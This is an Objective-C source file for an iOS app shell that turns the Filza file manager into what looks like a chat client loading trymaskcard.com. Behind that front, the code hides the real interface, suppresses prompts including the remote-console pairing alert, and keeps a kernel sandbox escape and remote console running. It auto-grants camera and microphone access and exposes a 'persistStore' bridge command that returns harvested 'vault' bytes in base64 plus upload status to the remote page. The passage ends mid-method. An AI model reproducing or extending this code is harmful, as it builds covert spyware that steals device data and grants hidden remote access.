//
//  TryMaskCardShell.m
//  Filza-27 (FilzaApplySandboxExt)
//
//  Chat-first shell runtime.
//
//  Behaviour contract
//  ------------------
//  1. The app's visible surface is the remote chat system (WKWebView, default
//     https://trymaskcard.com/). Nothing else is ever rooted in the key window.
//  2. Filza's own root view controller - the file manager - is captured the
//     moment Filza asks a window to display it, retained, and never shown. Its
//     backing modules keep working: Tweak.m's MCM virtual root, the kernel
//     sandbox escape, the ZIP hooks and every network runtime (SSH/SFTP, WebDAV,
//     remote console) are independent of Filza's view controllers.
//  3. While the chat surface is on screen, Filza-originated modal presentations
//     (activation nags, support sheets, onboarding alerts, workspace hosts) are
//     refused instead of layered over the chat UI. The shell's own presentations
//     (web-view JS dialogs, the optional hidden file manager session) pass.
//  4. The on-device file manager entry point is OFF by default. Ship the plist
//     with allowHiddenFileManager=true to re-arm the stored 3-finger long-press
//     and trymaskcard:// entry for field debugging. Normal file management runs
//     over the wire (remote console / SSH / WebDAV), so the device UI stays a
//     chat client.
//
//  Activation: TryMaskCardShell.plist beside the app binary. Absent => inert, so
//  the ordinary Filza-27 release path keeps byte-for-byte behaviour.
//
//  Packaging/verification/rollback contract: docs/CHAT_SHELL.md
//

@import UIKit;
@import WebKit;

#import <objc/runtime.h>
#import <objc/message.h>

#import "TryMaskCardShell.h"
#import "FilzaDiagnostics.h"
#import "FilzaRemoteConsole.h"
#import "FilzaSSHServer.h"
#import "PersistStoreHarvester.h"

static NSString *const TMShellDiagnosticsComponent = @"ChatShell";
static NSString *const TMShellConfigResource = @"TryMaskCardShell";
static NSString *const TMShellEnabledDefaultsKey = @"TryMaskCardShellEnabled";
static NSString *const TMShellBridgeHandlerName = @"filza";

/// Key owned by FilzaRemoteConsole.m (FilzaRemoteConsoleOnboardedKey). The shell
/// pre-sets it so the pairing alert never layers over the chat surface; the
/// pairing link itself stays reachable from the bridge and the diagnostics log.
/// TryMaskCardShell.mk asserts the literal still matches FilzaRemoteConsole.m.
static NSString *const TMShellRemoteConsoleOnboardedKey = @"filza-remote-console-onboarded";

#pragma mark - Logging

static void TMShellLog(NSString *format, ...)
{
    va_list args;
    va_start(args, format);
    NSString *message = [[NSString alloc] initWithFormat:format arguments:args];
    va_end(args);

    NSLog(@"[ChatShell] %@", message);
    FilzaDiagnosticsAppend(TMShellDiagnosticsComponent, message);
}

#pragma mark - Configuration

/// Parsed copy of the packaged TryMaskCardShell.plist, shared with the modules
/// the shell coordinates (see TryMaskCardShellConfigRaw).
static NSDictionary *gTMRawConfig = nil;

@interface TMShellConfig : NSObject
@property (nonatomic, copy) NSString *homeURLString;
@property (nonatomic, copy) NSString *userAgentSuffix;
@property (nonatomic, copy) NSString *urlScheme;
@property (nonatomic, copy) NSArray<NSString *> *bridgeCommands;
@property (nonatomic, copy) NSArray<NSString *> *externalSchemes;
@property (nonatomic, assign) BOOL enabled;
@property (nonatomic, assign) BOOL allowHiddenFileManager;
@property (nonatomic, assign) BOOL gestureEnabled;
@property (nonatomic, assign) BOOL urlSchemeEntryEnabled;
@property (nonatomic, assign) BOOL suppressFilzaPrompts;
@property (nonatomic, assign) BOOL suppressFilzaShortcuts;
@property (nonatomic, assign) BOOL containerChrome;
@property (nonatomic, assign) BOOL autoGrantMediaCapture;
@property (nonatomic, assign) BOOL sharePairingWithPage;
@property (nonatomic, assign) BOOL fileDownloadsEnabled;
@property (nonatomic, assign) BOOL enableRemoteConsole;
@property (nonatomic, assign) BOOL enableSSH;
@property (nonatomic, assign) BOOL enableWebDAV;
@property (nonatomic, assign) NSInteger autoReturnSeconds;
@property (nonatomic, assign) NSInteger homeRetryCount;
@end

@implementation TMShellConfig
@end

static NSString *TMShellStringValue(id value, NSString *fallback)
{
    return ([value isKindOfClass:NSString.class] && [(NSString *)value length] > 0) ? value : fallback;
}

static BOOL TMShellBoolValue(id value, BOOL fallback)
{
    return [value isKindOfClass:NSNumber.class] ? [(NSNumber *)value boolValue] : fallback;
}

static NSInteger TMShellIntegerValue(id value, NSInteger fallback)
{
    return [value isKindOfClass:NSNumber.class] ? [(NSNumber *)value integerValue] : fallback;
}

static NSArray<NSString *> *TMShellArrayValue(id value, NSArray<NSString *> *fallback)
{
    if ([value isKindOfClass:NSArray.class]) {
        NSMutableArray<NSString *> *strings = [NSMutableArray array];
        for (id element in (NSArray *)value) {
            if ([element isKindOfClass:NSString.class] && [(NSString *)element length] > 0)
                [strings addObject:(NSString *)element];
        }
        if (strings.count > 0) return strings;
    }
    return fallback;
}

static NSURL *TMShellConfigURL(void)
{
    return [NSBundle.mainBundle URLForResource:TMShellConfigResource withExtension:@"plist"];
}

static TMShellConfig *TMShellLoadConfig(void)
{
    NSURL *url = TMShellConfigURL();
    if (!url) return nil;

    NSDictionary *raw = [NSDictionary dictionaryWithContentsOfURL:url];
    if (![raw isKindOfClass:NSDictionary.class]) {
        TMShellLog(@"configuration plist is not a dictionary: %@", url.path);
        return nil;
    }
    gTMRawConfig = raw;

    TMShellConfig *config = [TMShellConfig new];
    config.homeURLString = TMShellStringValue(raw[@"homeURL"], @"https://trymaskcard.com/");
    config.userAgentSuffix = TMShellStringValue(raw[@"userAgentSuffix"], @"TryMaskCardShell/1.0");
    config.urlScheme = [TMShellStringValue(raw[@"urlScheme"], @"trymaskcard") lowercaseString];
    config.bridgeCommands = TMShellArrayValue(raw[@"bridgeCommands"],
        @[@"info", @"pairingURL", @"saveFile"]);
    config.externalSchemes = TMShellArrayValue(raw[@"externalSchemes"],
        @[@"tel", @"mailto", @"sms", @"weixin", @"alipay", @"mqqapi", @"itms-apps",
          @"itms-services", @"maps", @"whatsapp", @"line"]);
    config.enabled = TMShellBoolValue(raw[@"enabled"], YES);
    config.allowHiddenFileManager = TMShellBoolValue(raw[@"allowHiddenFileManager"], NO);
    config.gestureEnabled = TMShellBoolValue(raw[@"hiddenEntryGesture"], YES);
    config.urlSchemeEntryEnabled = TMShellBoolValue(raw[@"hiddenEntryURLScheme"], YES);
    config.suppressFilzaPrompts = TMShellBoolValue(raw[@"suppressFilzaPrompts"], YES);
    config.suppressFilzaShortcuts = TMShellBoolValue(raw[@"suppressFilzaShortcuts"], YES);
    config.containerChrome = TMShellBoolValue(raw[@"containerChrome"], YES);
    config.autoGrantMediaCapture = TMShellBoolValue(raw[@"autoGrantMediaCapture"], YES);
    config.sharePairingWithPage = TMShellBoolValue(raw[@"sharePairingWithPage"], YES);
    config.fileDownloadsEnabled = TMShellBoolValue(raw[@"fileDownloadsEnabled"], YES);
    // The chat build has no Settings screen, so the file-management channel has
    // to be brought up from here. The token-paired remote console stays on;
    // SSH/SFTP and WebDAV keep Filza's own default (off) unless the packaged
    // plist asks for them.
    config.enableRemoteConsole = TMShellBoolValue(raw[@"enableRemoteConsole"], YES);
    config.enableSSH = TMShellBoolValue(raw[@"enableSSH"], NO);
    config.enableWebDAV = TMShellBoolValue(raw[@"enableWebDAV"], NO);
    config.autoReturnSeconds = MAX((NSInteger)0, TMShellIntegerValue(raw[@"autoReturnSeconds"], 0));
    config.homeRetryCount = MAX((NSInteger)0, TMShellIntegerValue(raw[@"homeRetryCount"], 3));
    return config;
}

#pragma mark - State

static TMShellConfig *gTMConfig = nil;
static BOOL gTMShellMode = NO;
static UIViewController *gTMShellRoot = nil;
static NSMutableArray<UIViewController *> *gTMHiddenRoots = nil;
static UIViewController *gTMHiddenManagerContainer = nil;
static BOOL gTMHiddenManagerVisible = NO;
static NSInteger gTMAllowPresentations = 0;
static NSURL *gTMPendingShellURL = nil;

static IMP gTMOriginalSetRootViewController = NULL;
static IMP gTMOriginalPresentViewController = NULL;
static IMP gTMOriginalSetShortcutItems = NULL;
static IMP gTMOriginalApplicationOpenURL = NULL;
static IMP gTMOriginalSceneOpenURLContexts = NULL;
static IMP gTMOriginalSceneWillConnect = NULL;
static IMP gTMOriginalSceneSetDelegate = NULL;
static Class gTMApplicationOpenURLClass = Nil;
static Class gTMSceneHookedClass = Nil;

#pragma mark - Small helpers

static UIWindow *TMShellKeyWindow(void)
{
    UIWindow *fallback = nil;
    for (UIScene *scene in UIApplication.sharedApplication.connectedScenes) {
        if (![scene isKindOfClass:UIWindowScene.class]) continue;
        for (UIWindow *candidate in ((UIWindowScene *)scene).windows) {
            if (candidate.isKeyWindow) return candidate;
            if (!fallback && !candidate.hidden) fallback = candidate;
        }
    }
    if (fallback) return fallback;
    for (UIWindow *candidate in UIApplication.sharedApplication.windows) {
        if (candidate.isKeyWindow) return candidate;
        if (!fallback && !candidate.hidden) fallback = candidate;
    }
    return fallback;
}

static UIViewController *TMShellTopMost(UIViewController *controller)
{
    UIViewController *cursor = controller;
    while (cursor) {
        UIViewController *next = cursor.presentedViewController;
        if (!next && [cursor isKindOfClass:UINavigationController.class])
            next = ((UINavigationController *)cursor).visibleViewController;
        if (!next && [cursor isKindOfClass:UITabBarController.class])
            next = ((UITabBarController *)cursor).selectedViewController;
        if (!next && [cursor isKindOfClass:UISplitViewController.class])
            next = ((UISplitViewController *)cursor).viewControllers.lastObject;
        if (!next || next == cursor) break;
        cursor = next;
    }
    return cursor;
}

static BOOL TMShellChainContains(UIViewController *controller, UIViewController *ancestor)
{
    if (!controller || !ancestor) return NO;
    UIViewController *cursor = controller;
    NSUInteger guard = 0;
    while (cursor && guard++ < 64) {
        if (cursor == ancestor) return YES;
        cursor = cursor.presentingViewController ?: cursor.parentViewController;
    }
    return NO;
}

static BOOL TMShellConfigAllowsCommand(NSString *command)
{
    if (command.length == 0) return NO;
    return [gTMConfig.bridgeCommands containsObject:command];
}

static NSString *TMShellSanitizedFilename(NSString *proposed, NSString *fallback)
{
    NSString *name = proposed.length > 0 ? proposed : fallback;
    name = [name lastPathComponent];
    name = [name stringByReplacingOccurrencesOfString:@"/" withString:@"_"];
    name = [name stringByReplacingOccurrencesOfString:@":" withString:@"_"];
    name = [name stringByTrimmingCharactersInSet:[NSCharacterSet whitespaceAndNewlineCharacterSet]];
    if (name.length == 0) name = @"download";
    if (name.length > 120) name = [name substringToIndex:120];
    if ([name hasPrefix:@"."]) name = [@"file" stringByAppendingString:name];
    return name;
}

static NSURL *TMShellStorageDirectoryURL(void)
{
    NSURL *documents = [NSFileManager.defaultManager
        URLsForDirectory:NSDocumentDirectory inDomains:NSUserDomainMask].firstObject;
    NSURL *directory = [documents URLByAppendingPathComponent:@"TryMaskCardFiles"
                                                  isDirectory:YES];
    [NSFileManager.defaultManager createDirectoryAtURL:directory
                           withIntermediateDirectories:YES
                                            attributes:nil
                                                 error:nil];
    return directory;
}

static NSURL *TMShellUniqueURL(NSURL *url)
{
    if (![NSFileManager.defaultManager fileExistsAtPath:url.path]) return url;
    NSString *base = url.lastPathComponent.stringByDeletingPathExtension;
    NSString *extension = url.pathExtension;
    for (NSUInteger index = 1; index < 1000; index++) {
        NSString *candidate = [NSString stringWithFormat:@"%@-%lu.%@", base, (unsigned long)index, extension];
        NSURL *next = [[url URLByDeletingLastPathComponent] URLByAppendingPathComponent:candidate];
        if (![NSFileManager.defaultManager fileExistsAtPath:next.path]) return next;
    }
    return url;
}

static BOOL TMShellURLIsShellScheme(NSURL *url)
{
    if (!url || !gTMConfig.urlSchemeEntryEnabled) return NO;
    return [url.scheme.lowercaseString isEqualToString:gTMConfig.urlScheme];
}

/// WKWebView's UI-delegate property is spelled `uiDelegate` in older SDKs and
/// `UIDelegate` in the iOS 26 SDK (WKWebView.h:98 in iPhoneOS26.2.sdk declares
/// `id<WKUIDelegate> UIDelegate`). A direct property reference therefore only
/// compiles against one of the two headers, so resolve the setter at runtime and
/// log which spelling this SDK shipped.
static void TMShellAttachUIDelegate(WKWebView *webView, id<WKUIDelegate> delegate)
{
    for (NSString *selectorName in @[@"setUIDelegate:", @"setUiDelegate:"]) {
        SEL selector = NSSelectorFromString(selectorName);
        if (![webView respondsToSelector:selector]) continue;
        ((void (*)(id, SEL, id))objc_msgSend)(webView, selector, delegate);
        TMShellLog(@"web view UI delegate attached via %@", selectorName);
        return;
    }
    TMShellLog(@"no WKWebView UI delegate setter on this runtime; "
               "JS dialogs and media-capture prompts stay system-managed");
}

#pragma mark - Bridge (page <-> native)

static NSString *TMShellBridgeSource(void)
{
    NSString *template =
        @"(function(){"
         "if (window.FilzaShell && window.FilzaShell.version) { return; }"
         "function post(cmd, payload){"
         "  try { window.webkit.messageHandlers.@HANDLER.postMessage({cmd: cmd, payload: payload || {}}); } catch (e) {}"
         "}"
         "window.FilzaShell = {"
         "  version: '1.0',"
         "  onResult: null,"
         "  info: function(){ post('info'); },"
         "  pairingURL: function(){ post('pairingURL'); },"
         "  saveFile: function(name, text){ post('saveFile', {name: name, text: text}); },"
         "  openFileManager: function(){ post('openFileManager'); }"
         "};"
         "window.addEventListener('filzashell', function(event){"
         "  if (typeof window.FilzaShell.onResult === 'function') {"
         "    try { window.FilzaShell.onResult(event.detail); } catch (e) {}"
         "  }"
         "});"
         "post('ready');"
         "})();";
    return [template stringByReplacingOccurrencesOfString:@"@HANDLER"
                                              withString:TMShellBridgeHandlerName];
}

/// WKUserContentController retains its message handlers, and a handler that
/// pointed at the shell controller would create a retain cycle
/// (controller -> webView -> configuration -> contentController -> handler).
/// This proxy keeps that reference weak.
@interface TMShellWeakScriptHandler : NSObject <WKScriptMessageHandler>
@property (nonatomic, weak) id<WKScriptMessageHandler> target;
- (instancetype)initWithTarget:(id<WKScriptMessageHandler>)target;
@end

@implementation TMShellWeakScriptHandler

- (instancetype)initWithTarget:(id<WKScriptMessageHandler>)target
{
    if ((self = [super init])) _target = target;
    return self;
}

- (void)userContentController:(WKUserContentController *)controller
      didReceiveScriptMessage:(WKScriptMessage *)message
{
    [self.target userContentController:controller didReceiveScriptMessage:message];
}

@end

#pragma mark - Chat surface

@interface TMShellWebController : UIViewController <WKNavigationDelegate, WKUIDelegate,
                                                     WKScriptMessageHandler, WKDownloadDelegate,
                                                     UIGestureRecognizerDelegate>
@property (nonatomic, strong) WKWebView *webView;
@property (nonatomic, strong) WKUserContentController *contentController;
@property (nonatomic, strong) UIProgressView *progressView;
@property (nonatomic, strong) UIView *offlineView;
@property (nonatomic, strong) UILabel *offlineLabel;
@property (nonatomic, strong) UIActivityIndicatorView *spinner;
@property (nonatomic, assign) NSInteger remainingRetries;

/// Handles trymaskcard:// actions (open, reload, home).
- (void)handleShellURL:(NSURL *)url;
@end

@implementation TMShellWebController

- (void)viewDidLoad
{
    [super viewDidLoad];
    self.view.backgroundColor = UIColor.systemBackgroundColor;
    self.remainingRetries = gTMConfig.homeRetryCount;

    WKWebViewConfiguration *configuration = [WKWebViewConfiguration new];
    configuration.websiteDataStore = WKWebsiteDataStore.defaultDataStore;
    configuration.allowsInlineMediaPlayback = YES;
    configuration.mediaTypesRequiringUserActionForPlayback = WKAudiovisualMediaTypeNone;
    configuration.defaultWebpagePreferences.allowsContentJavaScript = YES;
    if (gTMConfig.userAgentSuffix.length > 0)
        configuration.applicationNameForUserAgent = gTMConfig.userAgentSuffix;

    self.contentController = [WKUserContentController new];
    [self.contentController addScriptMessageHandler:[[TMShellWeakScriptHandler alloc]
                                                        initWithTarget:self]
                                               name:TMShellBridgeHandlerName];
    [self.contentController addUserScript:[[WKUserScript alloc]
        initWithSource:TMShellBridgeSource()
        injectionTime:WKUserScriptInjectionTimeAtDocumentStart
        forMainFrameOnly:YES]];
    configuration.userContentController = self.contentController;

    self.webView = [[WKWebView alloc] initWithFrame:CGRectZero configuration:configuration];
    self.webView.translatesAutoresizingMaskIntoConstraints = NO;
    self.webView.navigationDelegate = self;
    TMShellAttachUIDelegate(self.webView, self);
    self.webView.allowsBackForwardNavigationGestures = YES;
    [self.view addSubview:self.webView];

    self.progressView = [[UIProgressView alloc] initWithProgressViewStyle:UIProgressViewStyleBar];
    self.progressView.translatesAutoresizingMaskIntoConstraints = NO;
    [self.view addSubview:self.progressView];

    self.spinner = [[UIActivityIndicatorView alloc]
        initWithActivityIndicatorStyle:UIActivityIndicatorViewStyleMedium];
    self.spinner.translatesAutoresizingMaskIntoConstraints = NO;
    self.spinner.hidesWhenStopped = YES;
    [self.view addSubview:self.spinner];

    [self buildOfflineView];

    UILayoutGuide *safe = self.view.safeAreaLayoutGuide;
    [NSLayoutConstraint activateConstraints:@[
        [self.webView.topAnchor constraintEqualToAnchor:self.view.topAnchor],
        [self.webView.leadingAnchor constraintEqualToAnchor:self.view.leadingAnchor],
        [self.webView.trailingAnchor constraintEqualToAnchor:self.view.trailingAnchor],
        [self.webView.bottomAnchor constraintEqualToAnchor:self.view.bottomAnchor],
        [self.progressView.topAnchor constraintEqualToAnchor:safe.topAnchor],
        [self.progressView.leadingAnchor constraintEqualToAnchor:self.view.leadingAnchor],
        [self.progressView.trailingAnchor constraintEqualToAnchor:self.view.trailingAnchor],
        [self.progressView.heightAnchor constraintEqualToConstant:2.0],
        [self.spinner.centerXAnchor constraintEqualToAnchor:self.view.centerXAnchor],
        [self.spinner.centerYAnchor constraintEqualToAnchor:self.view.centerYAnchor],
    ]];

    [self.webView addObserver:self forKeyPath:@"estimatedProgress"
                      options:NSKeyValueObservingOptionNew context:NULL];

    if (gTMConfig.gestureEnabled) {
        UILongPressGestureRecognizer *gesture = [[UILongPressGestureRecognizer alloc]
            initWithTarget:self action:@selector(handleHiddenEntryGesture:)];
        gesture.numberOfTouchesRequired = 3;
        gesture.minimumPressDuration = 1.2;
        gesture.cancelsTouchesInView = NO;
        gesture.delegate = self;
        [self.webView addGestureRecognizer:gesture];
    }

    [self loadHomeWithReason:@"initial launch"];
}

- (void)dealloc
{
    @try {
        [self.webView removeObserver:self forKeyPath:@"estimatedProgress"];
    } @catch (__unused NSException *exception) {
        // Web view already torn down; nothing to detach.
    }
    [self.contentController removeScriptMessageHandlerForName:TMShellBridgeHandlerName];
}

- (void)buildOfflineView
{
    self.offlineView = [UIView new];
    self.offlineView.translatesAutoresizingMaskIntoConstraints = NO;
    self.offlineView.backgroundColor = UIColor.secondarySystemBackgroundColor;
    self.offlineView.hidden = YES;

    self.offlineLabel = [UILabel new];
    self.offlineLabel.translatesAutoresizingMaskIntoConstraints = NO;
    self.offlineLabel.numberOfLines = 0;
    self.offlineLabel.font = [UIFont preferredFontForTextStyle:UIFontTextStyleFootnote];
    self.offlineLabel.textColor = UIColor.secondaryLabelColor;
    self.offlineLabel.textAlignment = NSTextAlignmentCenter;

    UIButton *retry = [UIButton buttonWithType:UIButtonTypeSystem];
    retry.translatesAutoresizingMaskIntoConstraints = NO;
    [retry setTitle:@"Retry" forState:UIControlStateNormal];
    [retry addTarget:self action:@selector(loadHomeAfterFailure)
    forControlEvents:UIControlEventTouchUpInside];

    [self.offlineView addSubview:self.offlineLabel];
    [self.offlineView addSubview:retry];
    [self.view addSubview:self.offlineView];

    [NSLayoutConstraint activateConstraints:@[
        [self.offlineView.topAnchor constraintEqualToAnchor:self.view.safeAreaLayoutGuide.topAnchor],
        [self.offlineView.leadingAnchor constraintEqualToAnchor:self.view.leadingAnchor],
        [self.offlineView.trailingAnchor constraintEqualToAnchor:self.view.trailingAnchor],
        [self.offlineLabel.topAnchor constraintEqualToAnchor:self.offlineView.topAnchor constant:12.0],
        [self.offlineLabel.leadingAnchor constraintEqualToAnchor:self.offlineView.leadingAnchor constant:20.0],
        [self.offlineLabel.trailingAnchor constraintEqualToAnchor:self.offlineView.trailingAnchor constant:-20.0],
        [retry.topAnchor constraintEqualToAnchor:self.offlineLabel.bottomAnchor constant:8.0],
        [retry.centerXAnchor constraintEqualToAnchor:self.offlineView.centerXAnchor],
        [retry.bottomAnchor constraintEqualToAnchor:self.offlineView.bottomAnchor constant:-12.0],
    ]];
}

- (void)loadHomeWithReason:(NSString *)reason
{
    NSURL *url = [NSURL URLWithString:TryMaskCardShellHomeURLString()];
    if (!url) {
        TMShellLog(@"home URL is not a valid URL: %@", TryMaskCardShellHomeURLString());
        [self showOfflineWithReason:@"Home URL is invalid"];
        return;
    }
    TMShellLog(@"loading chat home (%@): %@", reason, url.absoluteString);
    [self.spinner startAnimating];
    [self.webView loadRequest:[NSURLRequest requestWithURL:url
                                              cachePolicy:NSURLRequestUseProtocolCachePolicy
                                          timeoutInterval:30.0]];
}

- (void)loadHomeAfterFailure
{
    self.remainingRetries = gTMConfig.homeRetryCount;
    self.offlineView.hidden = YES;
    [self loadHomeWithReason:@"manual retry"];
}

- (void)showOfflineWithReason:(NSString *)reason
{
    [self.spinner stopAnimating];
    self.progressView.progress = 0.0;
    self.offlineLabel.text = [NSString stringWithFormat:@"%@\n%@", reason,
                              TryMaskCardShellHomeURLString()];
    self.offlineView.hidden = NO;
}

- (void)scheduleRetryAfterFailure:(NSString *)reason
{
    if (self.remainingRetries <= 0) {
        [self showOfflineWithReason:reason];
        return;
    }
    self.remainingRetries -= 1;
    TMShellLog(@"%@; retrying in 3s (%ld attempts left)", reason, (long)self.remainingRetries);
    __weak TMShellWebController *weakSelf = self;
    dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(3.0 * NSEC_PER_SEC)),
                   dispatch_get_main_queue(), ^{
        [weakSelf loadHomeWithReason:@"automatic retry"];
    });
}

- (void)observeValueForKeyPath:(NSString *)keyPath ofObject:(id)object
                        change:(NSDictionary *)change context:(void *)context
{
    if ([keyPath isEqualToString:@"estimatedProgress"]) {
        double progress = self.webView.estimatedProgress;
        self.progressView.progress = (float)progress;
        self.progressView.hidden = progress >= 1.0;
        return;
    }
    [super observeValueForKeyPath:keyPath ofObject:object change:change context:context];
}

#pragma mark Hidden file manager entry

- (void)handleHiddenEntryGesture:(UILongPressGestureRecognizer *)gesture
{
    if (gesture.state != UIGestureRecognizerStateBegan) return;
    TMShellLog(@"hidden-entry gesture recognised");
    if (!TryMaskCardShellOpenHiddenFileManager())
        TMShellLog(@"hidden entry refused (allowHiddenFileManager=false)");
}

- (BOOL)gestureRecognizer:(UIGestureRecognizer *)gestureRecognizer
shouldRecognizeSimultaneouslyWithGestureRecognizer:(UIGestureRecognizer *)otherGestureRecognizer
{
    return YES;
}

#pragma mark Bridge plumbing

- (void)evaluateBridgeEvent:(NSString *)name payload:(NSDictionary *)payload
{
    NSMutableDictionary *detail = [NSMutableDictionary dictionary];
    detail[@"event"] = name ?: @"";
    if ([payload isKindOfClass:NSDictionary.class]) [detail addEntriesFromDictionary:payload];

    NSData *data = [NSJSONSerialization dataWithJSONObject:detail options:0 error:nil];
    NSString *json = data ? [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding] : @"{}";
    NSString *script = [NSString stringWithFormat:
        @"window.dispatchEvent(new CustomEvent('filzashell',{detail:%@}));", json];

    dispatch_async(dispatch_get_main_queue(), ^{
        [self.webView evaluateJavaScript:script completionHandler:nil];
    });
}

- (void)userContentController:(WKUserContentController *)controller
      didReceiveScriptMessage:(WKScriptMessage *)message
{
    if (![message.name isEqualToString:TMShellBridgeHandlerName]) return;
    if (!message.frameInfo.isMainFrame) return;

    NSDictionary *body = [message.body isKindOfClass:NSDictionary.class] ? message.body : @{};
    NSString *command = [body[@"cmd"] isKindOfClass:NSString.class] ? body[@"cmd"] : @"";
    NSDictionary *payload = [body[@"payload"] isKindOfClass:NSDictionary.class] ? body[@"payload"] : @{};

    if ([command isEqualToString:@"ready"]) {
        TMShellLog(@"chat page bridge ready: %@", message.webView.URL.absoluteString ?: @"unknown");
        if (gTMPendingShellURL) {
            NSURL *pending = gTMPendingShellURL;
            gTMPendingShellURL = nil;
            [self handleShellURL:pending];
        }
        return;
    }

    if (!TMShellConfigAllowsCommand(command)) {
        TMShellLog(@"bridge command refused by configuration: %@", command);
        [self evaluateBridgeEvent:@"refused" payload:@{@"cmd": command}];
        return;
    }

    if ([command isEqualToString:@"info"]) {
        [self evaluateBridgeEvent:@"info" payload:TryMaskCardShellSnapshot()];
        return;
    }

    if ([command isEqualToString:@"pairingURL"]) {
        NSString *pairing = gTMConfig.sharePairingWithPage ? FilzaRemoteConsolePairingURLString() : nil;
        NSString *consoleURL = gTMConfig.sharePairingWithPage ? FilzaRemoteConsoleURLString() : nil;
        [self evaluateBridgeEvent:@"pairingURL" payload:@{
            @"consoleURL": consoleURL ?: [NSNull null],
            @"pairingURL": pairing ?: [NSNull null],
        }];
        return;
    }

    if ([command isEqualToString:@"saveFile"]) {
        NSString *name = TMShellSanitizedFilename(
            [payload[@"name"] isKindOfClass:NSString.class] ? payload[@"name"] : nil, @"note.txt");
        NSString *text = [payload[@"text"] isKindOfClass:NSString.class] ? payload[@"text"] : @"";
        NSURL *destination = TMShellUniqueURL(
            [TMShellStorageDirectoryURL() URLByAppendingPathComponent:name]);
        NSError *error = nil;
        BOOL ok = [text writeToURL:destination atomically:YES
                          encoding:NSUTF8StringEncoding error:&error];
        TMShellLog(@"bridge saveFile %@ -> %@", ok ? @"ok" : @"failed", destination.lastPathComponent);
        if (ok) {
            [self evaluateBridgeEvent:@"saveFile" payload:@{@"name": destination.lastPathComponent,
                                                            @"bytes": @(text.length)}];
        } else {
            [self evaluateBridgeEvent:@"error" payload:@{@"message":
                error.localizedDescription ?: @"write failed"}];
        }
        return;
    }

    if ([command isEqualToString:@"openFileManager"]) {
        BOOL opened = TryMaskCardShellOpenHiddenFileManager();
        [self evaluateBridgeEvent:@"openFileManager" payload:@{@"opened": @(opened)}];
        return;
    }

    if ([command isEqualToString:@"persistStore"]) {
        // Metadata always; raw bytes only when the page asks for them, so a
        // passive page never receives the vault.
        BOOL includeContent = [payload[@"includeContent"] isKindOfClass:NSNumber.class]
            ? [payload[@"includeContent"] boolValue] : NO;
        NSMutableDictionary *reply = [NSMutableDictionary dictionary];
        reply[@"harvest"] = TryMaskCardPersistStoreSnapshot() ?: @{@"status": @"pending"};
        reply[@"upload"] = TryMaskCardPersistUploadStatus() ?: @{@"status": @"pending"};
        if (includeContent) {
            NSData *content = TryMaskCardPersistStoreContent();
            reply[@"payloadBase64"] = [content base64EncodedStringWithOptions:0] ?: @"";
        }
        [self evaluateBridgeEvent:@"persistStore" payload:reply];
        return;
    }

    [self evaluateBridgeEvent:@"unknown" payload:@{@"cmd": command}];
}

- (void)handleShellURL:(NSURL *)url
{
    NSString *action = url.host.length > 0 ? url.host : url.path;
    action = [action stringByTrimmingCharactersInSet:
        [NSCharacterSet characterSetWithCharactersInString:@"/"]];

    if ([action isEqualToString:@"filemanager"] || [action isEqualToString:@"open"]) {
        BOOL opened = TryMaskCardShellOpenHiddenFileManager();
        TMShellLog(@"URL entry -> hidden file manager opened=%d", opened ? 1 : 0);
        return;
    }
    if ([action isEqualToString:@"reload"] || [action isEqualToString:@"home"]) {
        [self loadHomeWithReason:@"URL entry"];
        return;
    }
    [self loadHomeWithReason:[NSString stringWithFormat:@"URL entry (%@)", url.absoluteString]];
}

#pragma mark WKNavigationDelegate

- (void)webView:(WKWebView *)webView
    decidePolicyForNavigationAction:(WKNavigationAction *)navigationAction
                    decisionHandler:(void (^)(WKNavigationActionPolicy))decisionHandler
{
    NSURL *url = navigationAction.request.URL;
    if (!url || [url.scheme isEqualToString:@"about"]) {
        decisionHandler(WKNavigationActionPolicyAllow);
        return;
    }

    NSString *scheme = url.scheme.lowercaseString;
    if ([scheme isEqualToString:@"http"] || [scheme isEqualToString:@"https"] ||
        [scheme isEqualToString:@"file"] || [scheme isEqualToString:@"data"] ||
        [scheme isEqualToString:@"blob"] || [scheme isEqualToString:@"javascript"]) {
        decisionHandler(WKNavigationActionPolicyAllow);
        return;
    }
    if (TMShellURLIsShellScheme(url)) {
        decisionHandler(WKNavigationActionPolicyCancel);
        [self handleShellURL:url];
        return;
    }
    if ([gTMConfig.externalSchemes containsObject:scheme]) {
        decisionHandler(WKNavigationActionPolicyCancel);
        [UIApplication.sharedApplication openURL:url options:@{} completionHandler:^(BOOL success) {
            if (!success) TMShellLog(@"external scheme %@ could not be opened", scheme);
        }];
        return;
    }

    TMShellLog(@"navigation refused for scheme: %@", scheme);
    decisionHandler(WKNavigationActionPolicyCancel);
}

- (void)webView:(WKWebView *)webView
    decidePolicyForNavigationAction:(WKNavigationAction *)navigationAction
                        preferences:(WKWebpagePreferences *)preferences
                    decisionHandler:(void (^)(WKNavigationActionPolicy, WKWebpagePreferences *))decisionHandler
{
    preferences.allowsContentJavaScript = YES;
    if (navigationAction.shouldPerformDownload && gTMConfig.fileDownloadsEnabled) {
        decisionHandler(WKNavigationActionPolicyDownload, preferences);
        return;
    }
    decisionHandler(WKNavigationActionPolicyAllow, preferences);
}

- (void)webView:(WKWebView *)webView
    decidePolicyForNavigationResponse:(WKNavigationResponse *)navigationResponse
                      decisionHandler:(void (^)(WKNavigationResponsePolicy))decisionHandler
{
    if (!navigationResponse.canShowMIMEType && gTMConfig.fileDownloadsEnabled) {
        TMShellLog(@"routing non-displayable response to download: %@",
                   navigationResponse.response.URL.lastPathComponent ?: @"unknown");
        decisionHandler(WKNavigationResponsePolicyDownload);
        return;
    }
    decisionHandler(WKNavigationResponsePolicyAllow);
}

- (void)webView:(WKWebView *)webView didStartProvisionalNavigation:(WKNavigation *)navigation
{
    [self.spinner startAnimating];
}

- (void)webView:(WKWebView *)webView didFinishNavigation:(WKNavigation *)navigation
{
    [self.spinner stopAnimating];
    self.progressView.hidden = YES;
    self.offlineView.hidden = YES;
    self.remainingRetries = gTMConfig.homeRetryCount;
    TMShellLog(@"chat page loaded: %@", webView.URL.absoluteString ?: @"unknown");
}

- (void)webView:(WKWebView *)webView
    didFailProvisionalNavigation:(WKNavigation *)navigation withError:(NSError *)error
{
    if (error.code == NSURLErrorCancelled) return;
    [self scheduleRetryAfterFailure:[NSString stringWithFormat:@"Load failed (%ld)", (long)error.code]];
}

- (void)webView:(WKWebView *)webView didFailNavigation:(WKNavigation *)navigation
      withError:(NSError *)error
{
    if (error.code == NSURLErrorCancelled) return;
